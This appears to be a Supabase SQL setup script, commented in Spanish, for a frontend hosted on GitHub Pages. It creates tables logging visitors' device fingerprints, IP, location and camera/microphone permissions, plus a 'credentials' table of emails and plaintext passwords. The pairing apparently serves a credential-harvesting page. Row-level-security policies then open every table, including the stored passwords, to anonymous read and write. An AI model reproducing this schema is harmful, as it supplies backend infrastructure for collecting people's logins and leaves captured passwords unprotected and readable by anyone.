-- Ejecuta este script en el SQL Editor de tu proyecto de Supabase

-- Crear tabla 'devices'
CREATE TABLE IF NOT EXISTS public.devices (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id TEXT UNIQUE NOT NULL,
    user_agent TEXT,
    platform TEXT,
    language TEXT,
    screen_width INTEGER,
    screen_height INTEGER,
    ip TEXT,
    location JSONB,
    permissions JSONB DEFAULT '{"camera": false, "microphone": false, "location": false}'::jsonb,
    status TEXT DEFAULT 'active',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
    last_active TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Crear tabla 'credentials'
CREATE TABLE IF NOT EXISTS public.credentials (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id TEXT NOT NULL,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    remember BOOLEAN,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Crear tabla 'assistances'
CREATE TABLE IF NOT EXISTS public.assistances (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id TEXT NOT NULL,
    issue_type TEXT NOT NULL,
    description TEXT NOT NULL,
    status TEXT DEFAULT 'pending',
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Configurar políticas de seguridad (RLS)
ALTER TABLE public.devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credentials ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.assistances ENABLE ROW LEVEL SECURITY;

-- IMPORTANTE: Para GitHub Pages (Arquitectura Serverless basada 100% en el Frontend usando Anon Key).
-- Necesitamos crear Políticas que permitan a usuarios anónimos Insertar, Actualizar y Leer datos de demostración directamente.
-- Supabase por defecto rechaza cualquier conexión en el Frontend (código anon). Con las siguientes políticas anulamos eso para el proyecto:

-- Politicas para la tabla Devices
CREATE POLICY "Enable Read and Write Access for All" ON public.devices FOR ALL TO anon, public USING (true) WITH CHECK (true);

-- Politicas para la tabla Credentials
CREATE POLICY "Enable Read and Write Access for All" ON public.credentials FOR ALL TO anon, public USING (true) WITH CHECK (true);

-- Politicas para la tabla Assistances
CREATE POLICY "Enable Read and Write Access for All" ON public.assistances FOR ALL TO anon, public USING (true) WITH CHECK (true);
